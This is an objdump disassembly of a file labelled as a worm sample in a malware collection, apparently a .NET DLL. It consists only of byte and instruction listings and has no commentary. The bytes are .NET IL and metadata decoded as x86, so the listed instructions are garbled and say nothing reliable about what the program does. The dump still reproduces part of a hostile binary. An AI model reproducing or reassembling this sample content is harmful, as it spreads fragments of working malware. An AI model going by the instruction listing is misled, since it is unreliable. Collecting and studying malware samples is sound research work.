
malware_samples/worm/fb2f8488aefbb51bd4d82a4558e09ff82aa1c336fc764a05622cf07ffc8ed478.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	87 32                	xchg   %esi,(%edx)
10002002:	00 00                	add    %al,(%eax)
10002004:	00 00                	add    %al,(%eax)
10002006:	00 00                	add    %al,(%eax)
10002008:	48                   	dec    %eax
10002009:	00 00                	add    %al,(%eax)
1000200b:	00 02                	add    %al,(%edx)
1000200d:	00 05 00 80 23 00    	add    %al,0x238000
10002013:	00 58 0d             	add    %bl,0xd(%eax)
10002016:	00 00                	add    %al,(%eax)
10002018:	01 00                	add    %eax,(%eax)
	...
1000204e:	00 00                	add    %al,(%eax)
10002050:	13 30                	adc    (%eax),%esi
10002052:	03 00                	add    (%eax),%eax
10002054:	5a                   	pop    %edx
10002055:	00 00                	add    %al,(%eax)
10002057:	00 00                	add    %al,(%eax)
10002059:	00 00                	add    %al,(%eax)
1000205b:	00 72 01             	add    %dh,0x1(%edx)
1000205e:	00 00                	add    %al,(%eax)
10002060:	70 72                	jo     0x100020d4
10002062:	2b 00                	sub    (%eax),%eax
10002064:	00 70 28             	add    %dh,0x28(%eax)
10002067:	0a 00                	or     (%eax),%al
10002069:	00 0a                	add    %cl,(%edx)
1000206b:	26 28 04 00          	sub    %al,%es:(%eax,%eax,1)
1000206f:	00 06                	add    %al,(%esi)
10002071:	14 fe                	adc    $0xfe,%al
10002073:	06                   	push   %es
10002074:	06                   	push   %es
10002075:	00 00                	add    %al,(%eax)
10002077:	06                   	push   %es
10002078:	73 0b                	jae    0x10002085
1000207a:	00 00                	add    %al,(%eax)
1000207c:	0a 73 0c             	or     0xc(%ebx),%dh
1000207f:	00 00                	add    %al,(%eax)
10002081:	0a 25 17 6f 0d 00    	or     0xd6f17,%ah
10002087:	00 0a                	add    %cl,(%edx)
10002089:	6f                   	outsl  %ds:(%esi),(%dx)
1000208a:	0e                   	push   %cs
1000208b:	00 00                	add    %al,(%eax)
1000208d:	0a 14 fe             	or     (%esi,%edi,8),%dl
10002090:	06                   	push   %es
10002091:	03 00                	add    (%eax),%eax
10002093:	00 06                	add    %al,(%esi)
10002095:	73 0b                	jae    0x100020a2
10002097:	00 00                	add    %al,(%eax)
10002099:	0a 73 0c             	or     0xc(%ebx),%dh
1000209c:	00 00                	add    %al,(%eax)
1000209e:	0a 25 17 6f 0d 00    	or     0xd6f17,%ah
100020a4:	00 0a                	add    %cl,(%edx)
100020a6:	6f                   	outsl  %ds:(%esi),(%dx)
100020a7:	0e                   	push   %cs
100020a8:	00 00                	add    %al,(%eax)
100020aa:	0a 28                	or     (%eax),%ch
100020ac:	05 00 00 06 28       	add    $0x28060000,%eax
100020b1:	02 00                	add    (%eax),%al
100020b3:	00 06                	add    %al,(%esi)
100020b5:	2a 00                	sub    (%eax),%al
100020b7:	00 1b                	add    %bl,(%ebx)
100020b9:	30 02                	xor    %al,(%edx)
100020bb:	00 1b                	add    %bl,(%ebx)
100020bd:	00 00                	add    %al,(%eax)
100020bf:	00 00                	add    %al,(%eax)
100020c1:	00 00                	add    %al,(%eax)
100020c3:	00 28                	add    %ch,(%eax)
100020c5:	0f 00 00             	sldt   (%eax)
100020c8:	0a 6f 10             	or     0x10(%edi),%ch
100020cb:	00 00                	add    %al,(%eax)
100020cd:	0a 6f 11             	or     0x11(%edi),%ch
100020d0:	00 00                	add    %al,(%eax)
100020d2:	0a 1c 28             	or     (%eax,%ebp,1),%bl
100020d5:	12 00                	adc    (%eax),%al
100020d7:	00 0a                	add    %cl,(%edx)
100020d9:	de 03                	fiadds (%ebx)
100020db:	26 de 00             	fiadds %es:(%eax)
100020de:	2a 00                	sub    (%eax),%al
100020e0:	01 10                	add    %edx,(%eax)
100020e2:	00 00                	add    %al,(%eax)
100020e4:	00 00                	add    %al,(%eax)
100020e6:	00 00                	add    %al,(%eax)
100020e8:	17                   	pop    %ss
100020e9:	17                   	pop    %ss
100020ea:	00 03                	add    %al,(%ebx)
100020ec:	0a 00                	or     (%eax),%al
100020ee:	00 01                	add    %al,(%ecx)
100020f0:	1b 30                	sbb    (%eax),%esi
100020f2:	04 00                	add    $0x0,%al
100020f4:	68 00 00 00 01       	push   $0x1000000
100020f9:	00 00                	add    %al,(%eax)
100020fb:	11 00                	adc    %eax,(%eax)
100020fd:	73 13                	jae    0x10002112
100020ff:	00 00                	add    %al,(%eax)
10002101:	0a 0a                	or     (%edx),%cl
10002103:	06                   	push   %es
10002104:	72 3b                	jb     0x10002141
10002106:	00 00                	add    %al,(%eax)
10002108:	70 20                	jo     0x1000212a
1000210a:	f9                   	stc
1000210b:	0c 00                	or     $0x0,%al
1000210d:	00 6f 14             	add    %ch,0x14(%edi)
10002110:	00 00                	add    %al,(%eax)
10002112:	0a 06                	or     (%esi),%al
10002114:	6f                   	outsl  %ds:(%esi),(%dx)
10002115:	15 00 00 0a 0b       	adc    $0xb0a0000,%eax
1000211a:	28 16                	sub    %dl,(%esi)
1000211c:	00 00                	add    %al,(%eax)
1000211e:	0a 72 4f             	or     0x4f(%edx),%dh
10002121:	00 00                	add    %al,(%eax)
10002123:	70 6f                	jo     0x10002194
10002125:	17                   	pop    %ss
10002126:	00 00                	add    %al,(%eax)
10002128:	0a 0c 07             	or     (%edi,%eax,1),%cl
1000212b:	08 16                	or     %dl,(%esi)
1000212d:	08 8e 69 6f 18 00    	or     %cl,0x186f69(%esi)
10002133:	00 0a                	add    %cl,(%edx)
10002135:	de 0a                	fimuls (%edx)
10002137:	07                   	pop    %es
10002138:	2c 06                	sub    $0x6,%al
1000213a:	07                   	pop    %es
1000213b:	6f                   	outsl  %ds:(%esi),(%dx)
1000213c:	19 00                	sbb    %eax,(%eax)
1000213e:	00 0a                	add    %cl,(%edx)
10002140:	dc 06                	faddl  (%esi)
10002142:	6f                   	outsl  %ds:(%esi),(%dx)
10002143:	1a 00                	sbb    (%eax),%al
10002145:	00 0a                	add    %cl,(%edx)
10002147:	de 0a                	fimuls (%edx)
10002149:	06                   	push   %es
1000214a:	2c 06                	sub    $0x6,%al
1000214c:	06                   	push   %es
1000214d:	6f                   	outsl  %ds:(%esi),(%dx)
1000214e:	19 00                	sbb    %eax,(%eax)
10002150:	00 0a                	add    %cl,(%edx)
10002152:	dc de                	(bad)
10002154:	03 26                	add    (%esi),%esp
10002156:	de 00                	fiadds (%eax)
10002158:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
1000215e:	1b 00                	sbb    (%eax),%eax
10002160:	00 0a                	add    %cl,(%edx)
10002162:	2b 98 01 28 00 00    	sub    0x2801(%eax),%ebx
10002168:	02 00                	add    (%eax),%al
1000216a:	1e                   	push   %ds
1000216b:	00 1d 3b 00 0a 00    	add    %bl,0xa003b
10002171:	00 00                	add    %al,(%eax)
10002173:	00 02                	add    %al,(%edx)
10002175:	00 07                	add    %al,(%edi)
10002177:	00 46 4d             	add    %al,0x4d(%esi)
1000217a:	00 0a                	add    %cl,(%edx)
1000217c:	00 00                	add    %al,(%eax)
1000217e:	00 00                	add    %al,(%eax)
10002180:	00 00                	add    %al,(%eax)
10002182:	01 00                	add    %eax,(%eax)
10002184:	58                   	pop    %eax
10002185:	59                   	pop    %ecx
10002186:	00 03                	add    %al,(%ebx)
10002188:	0a 00                	or     (%eax),%al
1000218a:	00 01                	add    %al,(%ecx)
1000218c:	1b 30                	sbb    (%eax),%esi
1000218e:	02 00                	add    (%eax),%al
10002190:	8a 00                	mov    (%eax),%al
10002192:	00 00                	add    %al,(%eax)
10002194:	02 00                	add    (%eax),%al
10002196:	00 11                	add    %dl,(%ecx)
10002198:	28 0f                	sub    %cl,(%edi)
1000219a:	00 00                	add    %al,(%eax)
1000219c:	0a 6f 10             	or     0x10(%edi),%ch
1000219f:	00 00                	add    %al,(%eax)
100021a1:	0a 6f 11             	or     0x11(%edi),%ch
100021a4:	00 00                	add    %al,(%eax)
100021a6:	0a 0a                	or     (%edx),%cl
100021a8:	28 1c 00             	sub    %bl,(%eax,%eax,1)
100021ab:	00 0a                	add    %cl,(%edx)
100021ad:	0b 16                	or     (%esi),%edx
100021af:	0c 2b                	or     $0x2b,%al
100021b1:	64 07                	fs pop %es
100021b3:	08 9a 0d 09 6f 1d    	or     %bl,0x1d6f090d(%edx)
100021b9:	00 00                	add    %al,(%eax)
100021bb:	0a 18                	or     (%eax),%bl
100021bd:	33 53 09             	xor    0x9(%ebx),%edx
100021c0:	6f                   	outsl  %ds:(%esi),(%dx)
100021c1:	1e                   	push   %ds
100021c2:	00 00                	add    %al,(%eax)
100021c4:	0a 2c 4b             	or     (%ebx,%ecx,2),%ch
100021c7:	09 6f 1f             	or     %ebp,0x1f(%edi)
100021ca:	00 00                	add    %al,(%eax)
100021cc:	0a 6f 20             	or     0x20(%edi),%ch
100021cf:	00 00                	add    %al,(%eax)
100021d1:	0a 72 8d             	or     -0x73(%edx),%dh
100021d4:	00 00                	add    %al,(%eax)
100021d6:	70 28                	jo     0x10002200
100021d8:	21 00                	and    %eax,(%eax)
100021da:	00 0a                	add    %cl,(%edx)
100021dc:	13 04 11             	adc    (%ecx,%edx,1),%eax
100021df:	04 28                	add    $0x28,%al
100021e1:	22 00                	and    (%eax),%al
100021e3:	00 0a                	add    %cl,(%edx)
100021e5:	2d 08 06 11 04       	sub    $0x4110608,%eax
100021ea:	28 23                	sub    %ah,(%ebx)
100021ec:	00 00                	add    %al,(%eax)
100021ee:	0a 09                	or     (%ecx),%cl
100021f0:	6f                   	outsl  %ds:(%esi),(%dx)
100021f1:	1f                   	pop    %ds
100021f2:	00 00                	add    %al,(%eax)
100021f4:	0a 6f 20             	or     0x20(%edi),%ch
100021f7:	00 00                	add    %al,(%eax)
100021f9:	0a 72 bb             	or     -0x45(%edx),%dh
100021fc:	00 00                	add    %al,(%eax)
100021fe:	70 28                	jo     0x10002228
10002200:	21 00                	and    %eax,(%eax)
10002202:	00 0a                	add    %cl,(%edx)
10002204:	72 d3                	jb     0x100021d9
10002206:	00 00                	add    %al,(%eax)
10002208:	70 13                	jo     0x1000221d
1000220a:	05 11 05 28 24       	add    $0x24280511,%eax
1000220f:	00 00                	add    %al,(%eax)
10002211:	0a 08                	or     (%eax),%cl
10002213:	17                   	pop    %ss
10002214:	58                   	pop    %eax
10002215:	0c 08                	or     $0x8,%al
10002217:	07                   	pop    %es
10002218:	8e 69 32             	mov    0x32(%ecx),%gs
1000221b:	96                   	xchg   %eax,%esi
1000221c:	de 03                	fiadds (%ebx)
1000221e:	26 de 00             	fiadds %es:(%eax)
10002221:	2a 00                	sub    (%eax),%al
10002223:	00 01                	add    %al,(%ecx)
10002225:	10 00                	adc    %al,(%eax)
10002227:	00 00                	add    %al,(%eax)
10002229:	00 00                	add    %al,(%eax)
1000222b:	00 86 86 00 03 0a    	add    %al,0xa030086(%esi)
10002231:	00 00                	add    %al,(%eax)
10002233:	01 1b                	add    %ebx,(%ebx)
10002235:	30 04 00             	xor    %al,(%eax,%eax,1)
10002238:	68 00 00 00 03       	push   $0x3000000
1000223d:	00 00                	add    %al,(%eax)
1000223f:	11 73 25             	adc    %esi,0x25(%ebx)
10002242:	00 00                	add    %al,(%eax)
10002244:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
1000224a:	7e 01                	jle    0x1000224d
1000224c:	00 00                	add    %al,(%eax)
1000224e:	04 17                	add    $0x17,%al
10002250:	6f                   	outsl  %ds:(%esi),(%dx)
10002251:	26 00 00             	add    %al,%es:(%eax)
10002254:	0a 7e 27             	or     0x27(%esi),%bh
10002257:	00 00                	add    %al,(%eax)
10002259:	0a 7e 02             	or     0x2(%esi),%bh
1000225c:	00 00                	add    %al,(%eax)
1000225e:	04 73                	add    $0x73,%al
10002260:	28 00                	sub    %al,(%eax)
10002262:	00 0a                	add    %cl,(%edx)
10002264:	0a 28                	or     (%eax),%ch
10002266:	0f 00 00             	sldt   (%eax)
10002269:	0a 6f 10             	or     0x10(%edi),%ch
1000226c:	00 00                	add    %al,(%eax)
1000226e:	0a 6f 11             	or     0x11(%edi),%ch
10002271:	00 00                	add    %al,(%eax)
10002273:	0a 28                	or     (%eax),%ch
10002275:	29 00                	sub    %eax,(%eax)
10002277:	00 0a                	add    %cl,(%edx)
10002279:	0b 72 82             	or     -0x7e(%edx),%esi
1000227c:	01 00                	add    %eax,(%eax)
1000227e:	70 07                	jo     0x10002287
10002280:	28 2a                	sub    %ch,(%edx)
10002282:	00 00                	add    %al,(%eax)
10002284:	0a 0c 28             	or     (%eax,%ebp,1),%cl
10002287:	16                   	push   %ss
10002288:	00 00                	add    %al,(%eax)
1000228a:	0a 08                	or     (%eax),%cl
1000228c:	6f                   	outsl  %ds:(%esi),(%dx)
1000228d:	17                   	pop    %ss
1000228e:	00 00                	add    %al,(%eax)
10002290:	0a 0d 7e 01 00 00    	or     0x17e,%cl
10002296:	04 09                	add    $0x9,%al
10002298:	09 8e 69 06 6f 2b    	or     %ecx,0x2b6f0669(%esi)
1000229e:	00 00                	add    %al,(%eax)
100022a0:	0a 26                	or     (%esi),%ah
100022a2:	de 03                	fiadds (%ebx)
100022a4:	26 de 00             	fiadds %es:(%eax)
100022a7:	2a 01                	sub    (%ecx),%al
100022a9:	10 00                	adc    %al,(%eax)
100022ab:	00 00                	add    %al,(%eax)
100022ad:	00 00                	add    %al,(%eax)
100022af:	00 64 64 00          	add    %ah,0x0(%esp,%eiz,2)
100022b3:	03 0a                	add    (%edx),%ecx
100022b5:	00 00                	add    %al,(%eax)
100022b7:	01 1b                	add    %ebx,(%ebx)
100022b9:	30 03                	xor    %al,(%ebx)
100022bb:	00 95 00 00 00 04    	add    %dl,0x4000000(%ebp)
100022c1:	00 00                	add    %al,(%eax)
100022c3:	11 7e 02             	adc    %edi,0x2(%esi)
100022c6:	00 00                	add    %al,(%eax)
100022c8:	04 73                	add    $0x73,%al
100022ca:	2c 00                	sub    $0x0,%al
100022cc:	00 0a                	add    %cl,(%edx)
100022ce:	0a 7e 2d             	or     0x2d(%esi),%bh
100022d1:	00 00                	add    %al,(%eax)
100022d3:	0a 7e 02             	or     0x2(%esi),%bh
100022d6:	00 00                	add    %al,(%eax)
100022d8:	04 73                	add    $0x73,%al
100022da:	28 00                	sub    %al,(%eax)
100022dc:	00 0a                	add    %cl,(%edx)
100022de:	0b 06                	or     (%esi),%eax
100022e0:	12 01                	adc    (%ecx),%al
100022e2:	6f                   	outsl  %ds:(%esi),(%dx)
100022e3:	2e 00 00             	add    %al,%cs:(%eax)
100022e6:	0a 0c 28             	or     (%eax,%ebp,1),%cl
100022e9:	16                   	push   %ss
100022ea:	00 00                	add    %al,(%eax)
100022ec:	0a 08                	or     (%eax),%cl
100022ee:	6f                   	outsl  %ds:(%esi),(%dx)
100022ef:	2f                   	das
100022f0:	00 00                	add    %al,(%eax)
100022f2:	0a 0d 09 72 82 01    	or     0x1827209,%cl
100022f8:	00 70 6f             	add    %dh,0x6f(%eax)
100022fb:	30 00                	xor    %al,(%eax)
100022fd:	00 0a                	add    %cl,(%edx)
100022ff:	2c de                	sub    $0xde,%al
10002301:	09 1f                	or     %ebx,(%edi)
10002303:	7c 16                	jl     0x1000231b
10002305:	6f                   	outsl  %ds:(%esi),(%dx)
10002306:	31 00                	xor    %eax,(%eax)
10002308:	00 0a                	add    %cl,(%edx)
1000230a:	17                   	pop    %ss
1000230b:	9a 13 04 28 0f 00 00 	lcall  $0x0,$0xf280413
10002312:	0a 6f 10             	or     0x10(%edi),%ch
10002315:	00 00                	add    %al,(%eax)
10002317:	0a 6f 11             	or     0x11(%edi),%ch
1000231a:	00 00                	add    %al,(%eax)
1000231c:	0a 28                	or     (%eax),%ch
1000231e:	29 00                	sub    %eax,(%eax)
10002320:	00 0a                	add    %cl,(%edx)
10002322:	13 05 11 04 11 05    	adc    0x5110411,%eax
10002328:	28 32                	sub    %dh,(%edx)
1000232a:	00 00                	add    %al,(%eax)
1000232c:	0a 2d b0 28 33 00    	or     0x3328b0,%ch
10002332:	00 0a                	add    %cl,(%edx)
10002334:	11 04 28             	adc    %eax,(%eax,%ebp,1)
10002337:	21 00                	and    %eax,(%eax)
10002339:	00 0a                	add    %cl,(%edx)
1000233b:	28 22                	sub    %ah,(%edx)
1000233d:	00 00                	add    %al,(%eax)
1000233f:	0a 2d 9d 72 aa 01    	or     0x1aa729d,%ch
10002345:	00 70 11             	add    %dh,0x11(%eax)
10002348:	04 28                	add    $0x28,%al
1000234a:	2a 00                	sub    (%eax),%al
1000234c:	00 0a                	add    %cl,(%edx)
1000234e:	28 34 00             	sub    %dh,(%eax,%eax,1)
10002351:	00 0a                	add    %cl,(%edx)
10002353:	2b 8a 26 de 00 2a    	sub    0x2a00de26(%edx),%ecx
10002359:	00 00                	add    %al,(%eax)
1000235b:	00 01                	add    %al,(%ecx)
1000235d:	10 00                	adc    %al,(%eax)
1000235f:	00 00                	add    %al,(%eax)
10002361:	00 1b                	add    %bl,(%ebx)
10002363:	00 76 91             	add    %dh,-0x6f(%esi)
10002366:	00 03                	add    %al,(%ebx)
10002368:	0a 00                	or     (%eax),%al
1000236a:	00 01                	add    %al,(%ecx)
1000236c:	1e                   	push   %ds
1000236d:	02 28                	add    (%eax),%ch
1000236f:	35 00 00 0a 2a       	xor    $0x2a0a0000,%eax
10002374:	2e 20 98 3a 00 00 80 	and    %bl,%cs:-0x7fffffc6(%eax)
1000237b:	02 00                	add    (%eax),%al
1000237d:	00 04 2a             	add    %al,(%edx,%ebp,1)
10002380:	42                   	inc    %edx
10002381:	53                   	push   %ebx
10002382:	4a                   	dec    %edx
10002383:	42                   	inc    %edx
10002384:	01 00                	add    %eax,(%eax)
10002386:	01 00                	add    %eax,(%eax)
10002388:	00 00                	add    %al,(%eax)
1000238a:	00 00                	add    %al,(%eax)
1000238c:	0c 00                	or     $0x0,%al
1000238e:	00 00                	add    %al,(%eax)
10002390:	76 34                	jbe    0x100023c6
10002392:	2e 30 2e             	xor    %ch,%cs:(%esi)
10002395:	33 30                	xor    (%eax),%esi
10002397:	33 31                	xor    (%ecx),%esi
10002399:	39 00                	cmp    %eax,(%eax)
1000239b:	00 00                	add    %al,(%eax)
1000239d:	00 05 00 6c 00 00    	add    %al,0x6c00
100023a3:	00 f4                	add    %dh,%ah
100023a5:	03 00                	add    (%eax),%eax
100023a7:	00 23                	add    %ah,(%ebx)
100023a9:	7e 00                	jle    0x100023ab
100023ab:	00 60 04             	add    %ah,0x4(%eax)
100023ae:	00 00                	add    %al,(%eax)
100023b0:	60                   	pusha
100023b1:	05 00 00 23 53       	add    $0x53230000,%eax
100023b6:	74 72                	je     0x1000242a
100023b8:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
100023bf:	00 c0                	add    %al,%al
100023c1:	09 00                	or     %eax,(%eax)
100023c3:	00 e8                	add    %ch,%al
100023c5:	01 00                	add    %eax,(%eax)
100023c7:	00 23                	add    %ah,(%ebx)
100023c9:	55                   	push   %ebp
100023ca:	53                   	push   %ebx
100023cb:	00 a8 0b 00 00 10    	add    %ch,0x1000000b(%eax)
100023d1:	00 00                	add    %al,(%eax)
100023d3:	00 23                	add    %ah,(%ebx)
100023d5:	47                   	inc    %edi
100023d6:	55                   	push   %ebp
100023d7:	49                   	dec    %ecx
100023d8:	44                   	inc    %esp
100023d9:	00 00                	add    %al,(%eax)
100023db:	00 b8 0b 00 00 a0    	add    %bh,-0x5ffffff5(%eax)
100023e1:	01 00                	add    %eax,(%eax)
100023e3:	00 23                	add    %ah,(%ebx)
100023e5:	42                   	inc    %edx
100023e6:	6c                   	insb   (%dx),%es:(%edi)
100023e7:	6f                   	outsl  %ds:(%esi),(%dx)
100023e8:	62 00                	bound  %eax,(%eax)
100023ea:	00 00                	add    %al,(%eax)
100023ec:	00 00                	add    %al,(%eax)
100023ee:	00 00                	add    %al,(%eax)
100023f0:	02 00                	add    (%eax),%al
100023f2:	00 01                	add    %al,(%ecx)
100023f4:	57                   	push   %edi
100023f5:	14 02                	adc    $0x2,%al
100023f7:	00 09                	add    %cl,(%ecx)
100023f9:	00 00                	add    %al,(%eax)
100023fb:	00 00                	add    %al,(%eax)
100023fd:	fa                   	cli
100023fe:	01 33                	add    %esi,(%ebx)
10002400:	00 16                	add    %dl,(%esi)
10002402:	00 00                	add    %al,(%eax)
10002404:	01 00                	add    %eax,(%eax)
10002406:	00 00                	add    %al,(%eax)
10002408:	29 00                	sub    %eax,(%eax)
1000240a:	00 00                	add    %al,(%eax)
1000240c:	03 00                	add    (%eax),%eax
1000240e:	00 00                	add    %al,(%eax)
10002410:	02 00                	add    (%eax),%al
10002412:	00 00                	add    %al,(%eax)
10002414:	08 00                	or     %al,(%eax)
10002416:	00 00                	add    %al,(%eax)
10002418:	35 00 00 00 09       	xor    $0x9000000,%eax
1000241d:	00 00                	add    %al,(%eax)
1000241f:	00 04 00             	add    %al,(%eax,%eax,1)
10002422:	00 00                	add    %al,(%eax)
10002424:	01 00                	add    %eax,(%eax)
10002426:	00 00                	add    %al,(%eax)
10002428:	06                   	push   %es
10002429:	00 00                	add    %al,(%eax)
1000242b:	00 00                	add    %al,(%eax)
1000242d:	00 5f 02             	add    %bl,0x2(%edi)
10002430:	01 00                	add    %eax,(%eax)
10002432:	00 00                	add    %al,(%eax)
10002434:	00 00                	add    %al,(%eax)
10002436:	06                   	push   %es
10002437:	00 76 01             	add    %dh,0x1(%esi)
1000243a:	41                   	inc    %ecx
1000243b:	03 06                	add    (%esi),%eax
1000243d:	00 c8                	add    %cl,%al
1000243f:	01 41 03             	add    %eax,0x3(%ecx)
10002442:	06                   	push   %es
10002443:	00 16                	add    %dl,(%esi)
10002445:	01 2e                	add    %ebp,(%esi)
10002447:	03 0f                	add    (%edi),%ecx
10002449:	00 61 03             	add    %ah,0x3(%ecx)
1000244c:	00 00                	add    %al,(%eax)
1000244e:	06                   	push   %es
1000244f:	00 2a                	add    %ch,(%edx)
10002451:	01 bc 02 06 00 41 01 	add    %edi,0x1410006(%edx,%eax,1)
10002458:	bc 02 06 00 af       	mov    $0xaf000602,%esp
1000245d:	01 bc 02 06 00 96 01 	add    %edi,0x1960006(%edx,%eax,1)
10002464:	bc 02 06 00 5e       	mov    $0x5e000602,%esp
10002469:	01 41 03             	add    %eax,0x3(%ecx)
1000246c:	06                   	push   %es
1000246d:	00 39                	add    %bh,(%ecx)
1000246f:	04 8e                	add    $0x8e,%al
10002471:	02 0a                	add    (%edx),%cl
10002473:	00 83 04 18 04 06    	add    %al,0x6041804(%ebx)
10002479:	00 03                	add    %al,(%ebx)
1000247b:	01 8e 02 0e 00 74    	add    %ecx,0x74000e02(%esi)
10002481:	00 df                	add    %bl,%bh
10002483:	00 0e                	add    %cl,(%esi)
10002485:	00 33                	add    %dh,(%ebx)
10002487:	02 b6 03 0e 00 fd    	add    -0x2fff1fd(%esi),%dh
1000248d:	04 b6                	add    $0xb6,%al
1000248f:	03 0e                	add    (%esi),%ecx
10002491:	00 2f                	add    %ch,(%edi)
10002493:	02 b6 03 0e 00 3e    	add    0x3e000e03(%esi),%dh
10002499:	02 b6 03 0e 00 20    	add    0x20000e03(%esi),%dh
1000249f:	02 b6 03 0e 00 d9    	add    -0x26fff1fd(%esi),%dh
100024a5:	04 df                	add    $0xdf,%al
100024a7:	00 0a                	add    %cl,(%edx)
100024a9:	00 79 04             	add    %bh,0x4(%ecx)
100024ac:	18 04 0a             	sbb    %al,(%edx,%ecx,1)
100024af:	00 76 02             	add    %dh,0x2(%esi)
100024b2:	18 04 12             	sbb    %al,(%edx,%edx,1)
100024b5:	00 e3                	add    %ah,%bl
100024b7:	02 1d 00 16 00 a3    	add    0xa3001600,%bl
100024bd:	04 4c                	add    $0x4c,%al
100024bf:	04 0e                	add    $0xe,%al
100024c1:	00 6c 04 b6          	add    %ch,-0x4a(%esp,%eax,1)
100024c5:	03 06                	add    (%esi),%eax
100024c7:	00 ae 04 fc 01 06    	add    %ch,0x601fc04(%esi)
100024cd:	00 3e                	add    %bh,(%esi)
100024cf:	00 fc                	add    %bh,%ah
100024d1:	01 1a                	add    %ebx,(%edx)
100024d3:	00 06                	add    %al,(%esi)
100024d5:	04 2e                	add    $0x2e,%al
100024d7:	03 1a                	add    (%edx),%ebx
100024d9:	00 8b 00 2e 03 06    	add    %cl,0x6032e00(%ebx)
100024df:	00 6f 00             	add    %ch,0x0(%edi)
100024e2:	1d 00 06 00 70       	sbb    $0x70000600,%eax
100024e7:	03 1d 00 06 00 0d    	add    0xd000600,%ebx
100024ed:	02 df                	add    %bh,%bl
100024ef:	04 06                	add    $0x6,%al
100024f1:	00 87 02 1d 00 06    	add    %al,0x6001d02(%edi)
100024f7:	00 5b 00             	add    %bl,0x0(%ebx)
100024fa:	8e 02                	mov    (%edx),%es
100024fc:	12 00                	adc    (%eax),%al
100024fe:	d5 00                	aad    $0x0
10002500:	1d 00 06 00 fc       	sbb    $0xfc000600,%eax
10002505:	02 1d 00 06 00 ed    	add    0xed000600,%bl
1000250b:	02 1d 00 06 00 4f    	add    0x4f000600,%bl
10002511:	02 1d 00 16 00 0e    	add    0xe001600,%bl
10002517:	04 4c                	add    $0x4c,%al
10002519:	04 06                	add    $0x6,%al
1000251b:	00 19                	add    %bl,(%ecx)
1000251d:	02 8e 02 06 00 ce    	add    -0x31fff9fe(%esi),%cl
10002523:	03 8e 02 06 00 97    	add    -0x68fff9fe(%esi),%ecx
10002529:	04 8e                	add    $0x8e,%al
1000252b:	02 00                	add    (%eax),%al
1000252d:	00 00                	add    %al,(%eax)
1000252f:	00 0a                	add    %cl,(%edx)
10002531:	00 00                	add    %al,(%eax)
10002533:	00 00                	add    %al,(%eax)
10002535:	00 01                	add    %al,(%ecx)
10002537:	00 01                	add    %al,(%ecx)
10002539:	00 00                	add    %al,(%eax)
1000253b:	00 10                	add    %dl,(%eax)
1000253d:	00 a8 02 00 00 29    	add    %ch,0x29000002(%eax)
10002543:	00 01                	add    %al,(%ecx)
10002545:	00 01                	add    %al,(%ecx)
10002547:	00 80 01 10 00 5d    	add    %al,0x5d001001(%eax)
1000254d:	04 41                	add    $0x41,%al
1000254f:	03 29                	add    (%ecx),%ebp
10002551:	00 03                	add    %al,(%ebx)
10002553:	00 09                	add    %cl,(%ecx)
10002555:	00 11                	add    %dl,(%ecx)
10002557:	00 8d 04 0e 01 11    	add    %cl,0x11010e04(%ebp)
1000255d:	00 ba 04 12 01 50    	add    %bh,0x50011204(%edx)
10002563:	20 00                	and    %al,(%eax)
10002565:	00 00                	add    %al,(%eax)
10002567:	00 91 00 b7 02 15    	add    %dl,0x1502b700(%ecx)
1000256d:	01 01                	add    %eax,(%ecx)
1000256f:	00 b8 20 00 00 00    	add    %bh,0x20(%eax)
10002575:	00 91 00 67 00 15    	add    %dl,0x15006700(%ecx)
1000257b:	01 01                	add    %eax,(%ecx)
1000257d:	00 f0                	add    %dh,%al
1000257f:	20 00                	and    %al,(%eax)
10002581:	00 00                	add    %al,(%eax)
10002583:	00 91 00 40 04 15    	add    %dl,0x15044000(%ecx)
10002589:	01 01                	add    %eax,(%ecx)
1000258b:	00 8c 21 00 00 00 00 	add    %cl,0x0(%ecx,%eiz,1)
10002592:	91                   	xchg   %eax,%ecx
10002593:	00 13                	add    %dl,(%ebx)
10002595:	00 15 01 01 00 34    	add    %dl,0x34000101
1000259b:	22 00                	and    (%eax),%al
1000259d:	00 00                	add    %al,(%eax)
1000259f:	00 91 00 ee 01 15    	add    %dl,0x1501ee00(%ecx)
100025a5:	01 01                	add    %eax,(%ecx)
100025a7:	00 b8 22 00 00 00    	add    %bh,0x22(%eax)
100025ad:	00 91 00 10 03 15    	add    %dl,0x15031000(%ecx)
100025b3:	01 01                	add    %eax,(%ecx)
100025b5:	00 6c 23 00          	add    %ch,0x0(%ebx,%eiz,1)
100025b9:	00 00                	add    %al,(%eax)
100025bb:	00 86 18 21 03 06    	add    %al,0x6032118(%esi)
100025c1:	00 01                	add    %al,(%ecx)
100025c3:	00 74 23 00          	add    %dh,0x0(%ebx,%eiz,1)
100025c7:	00 00                	add    %al,(%eax)
100025c9:	00 91 18 27 03 15    	add    %dl,0x15032718(%ecx)
100025cf:	01 01                	add    %eax,(%ecx)
100025d1:	00 09                	add    %cl,(%ecx)
100025d3:	00 21                	add    %ah,(%ecx)
100025d5:	03 01                	add    (%ecx),%eax
100025d7:	00 11                	add    %dl,(%ecx)
100025d9:	00 21                	add    %ah,(%ecx)
100025db:	03 06                	add    (%esi),%eax
100025dd:	00 19                	add    %bl,(%ecx)
100025df:	00 21                	add    %ah,(%ecx)
100025e1:	03 0a                	add    (%edx),%ecx
100025e3:	00 29                	add    %ch,(%ecx)
100025e5:	00 21                	add    %ah,(%ecx)
100025e7:	03 10                	add    (%eax),%edx
100025e9:	00 31                	add    %dh,(%ecx)
100025eb:	00 21                	add    %ah,(%ecx)
100025ed:	03 10                	add    (%eax),%edx
100025ef:	00 39                	add    %bh,(%ecx)
100025f1:	00 21                	add    %ah,(%ecx)
100025f3:	03 10                	add    (%eax),%edx
100025f5:	00 41 00             	add    %al,0x0(%ecx)
100025f8:	21 03                	and    %eax,(%ebx)
100025fa:	10 00                	adc    %al,(%eax)
100025fc:	49                   	dec    %ecx
100025fd:	00 21                	add    %ah,(%ecx)
100025ff:	03 01                	add    (%ecx),%eax
10002601:	00 61 00             	add    %ah,0x0(%ecx)
10002604:	21 03                	and    %eax,(%ebx)
10002606:	06                   	push   %es
10002607:	00 79 00             	add    %bh,0x0(%ecx)
1000260a:	f8                   	clc
1000260b:	04 15                	add    $0x15,%al
1000260d:	00 c9                	add    %cl,%cl
1000260f:	00 21                	add    %ah,(%ecx)
10002611:	03 1c 00             	add    (%eax,%eax,1),%ebx
